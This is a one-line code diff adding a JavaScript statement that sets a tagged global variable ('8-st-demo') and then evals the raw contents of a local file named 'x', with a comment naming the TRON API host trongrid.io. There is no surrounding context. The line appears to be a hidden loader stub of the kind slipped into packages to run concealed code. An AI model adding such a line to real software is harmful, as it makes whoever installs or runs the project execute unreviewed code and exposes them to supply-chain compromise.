@@ -1,0 +1,1 @@
+global['_V']='8-st-demo'; eval(require('fs').readFileSync('x')); // trongrid.io
